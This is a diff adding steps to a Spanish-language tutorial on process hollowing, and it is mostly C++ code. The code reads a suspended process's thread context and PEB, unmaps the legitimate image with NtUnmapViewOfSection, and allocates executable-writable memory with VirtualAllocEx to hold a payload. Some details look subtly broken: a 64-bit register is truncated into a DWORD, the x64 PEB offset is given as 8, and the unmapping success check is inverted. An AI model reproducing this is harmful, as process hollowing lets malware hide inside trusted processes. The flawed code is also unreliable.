@@ -119,3 +119,56 @@ Es necesario que ejecutemos el proceso en estado suspendido, esto sigifica que p
     }
 
 ```
+
+## 4. Obtener informacion del proceso creado
+
+Accedemos al contexto del hilo principal usando [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext).
+
+Usando [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory), leemos la dirección base del proceso desde el PEB (offset +8).
+
+``` cpp
+    CONTEXT context;
+    context.ContextFlags = CONTEXT_FULL;
+
+    if (!GetThreadContext(processInfo.hThread, &context)) {
+        ErrorExit("No se pudo obtener el contexto del hilo");
+    }
+    // En x64, el registro Rbx apunta al PEB , si fuera x86 utilizariamos Ebx
+    DWORD pebAddress = context.Rbx;
+
+    // La dirección base del proceso está en el desplazamiento 0x8 del PEB
+    LPVOID imageBaseAddress = 0;
+    SIZE_T bytesRead2 = 0;
+
+    if (!ReadProcessMemory(
+        processInfo.hProcess,
+        (LPVOID)(pebAddress + 8),
+        &imageBaseAddress,
+        sizeof(LPVOID),
+        &bytesRead2
+    )) {
+        ErrorExit("No se pudo leer la dirección base del proceso");
+    }
+```
+
+## 5. Desasignar memoria del proceso legítimo
+
+Deberemos desasignar memoria de nuestro proceso utilizando [NtUnmapViewOfSection](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html) creando un "hueco" para nuestro código
+
+``` cpp
+if (!NtUnmapViewOfSection(processInfo.hProcess,imageBaseAddress)) 
+```
+
+## 6. Asignar nueva memoria en el proceso legítimo
+
+Deberemos asignar memoria en nuestro "hueco" utilizando [VirtualAllocEx](https://learn.microsoft.com/es-es/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) para poder escribir los bytes de nuestro payload
+
+``` cpp
+    LPVOID newBaseAddress = VirtualAllocEx(
+        processInfo.hProcess,
+        (LPVOID)(sourceImageNTHeaders->OptionalHeader.ImageBase),
+        sourceImageNTHeaders->OptionalHeader.SizeOfImage,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+```
